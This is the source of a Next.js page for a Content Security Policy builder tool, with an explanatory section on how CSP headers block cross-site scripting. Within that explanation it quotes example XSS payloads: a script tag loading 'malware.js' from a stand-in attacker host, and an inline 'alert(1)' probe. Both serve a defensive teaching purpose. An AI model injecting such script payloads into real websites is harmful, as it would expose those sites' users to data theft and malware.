import { Metadata } from 'next';
import { CATEGORIES } from '@/src/tool-registry';
import { ToolShell } from '@/components/ui/ToolShell';
import { ToolInfoSection } from '@/components/ui/ToolInfoSection';
import { generateToolMetadata } from '@/src/lib/seo';

import CspBuilderWrapper from './CspBuilderWrapper';

const toolId = 'csp-builder';
const cat = CATEGORIES.find(c => c.id === 'security');

export const metadata: Metadata = generateToolMetadata(toolId);

export default function Page() {
  return (
    <ToolShell 
      title="CSP Builder"
      description="Content Security Policy builder."
      category={cat}
      toolId={toolId}
    >
      <CspBuilderWrapper />

      <div className="mt-16 space-y-6 max-w-4xl mx-auto w-full">
        <ToolInfoSection
          id="learn-csp"
          title="How it Works: Mitigating XSS"
          preview="Learn how a single HTTP header can prevent cross-site scripting attacks."
        >
          <div className="prose prose-sm md:prose-base dark:prose-invert max-w-none">
            <p>
              Cross-Site Scripting (XSS) occurs when an attacker tricks a browser into executing malicious JavaScript on a legitimate website. Even if your site is perfectly coded, a compromised third-party script (like an analytics or ad tag) can steal your users' data.
            </p>
            <h3>The Content-Security-Policy Header</h3>
            <p>
              A Content Security Policy (CSP) is an HTTP header returned by your web server that strictly declares where resources can be loaded from. For example, <code>script-src 'self' https://trusted.com;</code> tells the browser to <strong>only</strong> execute JavaScript from your own domain or <code>trusted.com</code>.
            </p>
            <p>
              If a hacker successfully injects <code>&lt;script src="http://evil.com/malware.js"&gt;&lt;/script&gt;</code> into a comment on your site, the user's browser will outright block the script from downloading because <code>evil.com</code> is not on the CSP allowlist.
            </p>
            <h3>Inline Scripts</h3>
            <p>
              By default, a strong CSP will also block all inline scripts (like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) and <code>eval()</code> calls. To allow specific inline scripts safely, modern policies use cryptographic nonces (<code>script-src 'nonce-r4nd0m'</code>), forcing attackers to guess a server-generated random string for their injected script to execute.
            </p>
          </div>
        </ToolInfoSection>
      </div>
    </ToolShell>
  );
}
